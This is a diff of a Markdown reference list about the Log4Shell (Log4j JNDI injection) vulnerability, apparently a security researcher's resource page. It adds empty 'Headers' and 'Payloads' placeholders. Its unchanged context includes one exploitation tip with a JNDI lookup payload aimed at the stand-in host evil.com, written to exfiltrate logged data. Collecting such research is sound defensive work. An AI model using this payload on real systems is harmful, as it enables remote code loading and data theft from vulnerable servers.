@@ -1,7 +1,7 @@
 # TL;DR
 
 ![log4shell png](https://user-images.githubusercontent.com/35920302/146170447-915c1f09-8b34-4390-8f1b-95f9cf892c7a.jpeg)
-[Source](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
+[Source: musana.net](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
 
 # Technical analysis
 - [Log4j Analysis: More JNDI Injection](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/)
@@ -43,6 +43,12 @@
 - Some events are only logged when an exception ocur, so specially long payloads with unexpected characters may help you trigger those exceptions. [Source](https://twitter.com/pwntester/status/1470435811812380675)
 - If you omit the closing brace `}` (so the payload would look like `${jndi:ldap://evil.com/`), you will potentially get a bunch of data exfiltrated to your server until the next `}` appears in that data. [Source](https://twitter.com/TomAnthonySEO/status/1470374984749133825)
 
+# Headers
+[TODO]
+
+# Payloads
+[TODO]
+
 # WAF bypasses
 
 # Mega threads
@@ -61,3 +67,6 @@
 - [VCenter](https://twitter.com/w3bd3vil/status/1469814463414951937)
 - [Ghidra](https://twitter.com/zhuowei/status/1469186818549719042)
 - [Apache JAMES SMTP server](https://twitter.com/dlitchfield/status/1469809966785564675)
+
+# TODO
+- Add payloads & headers
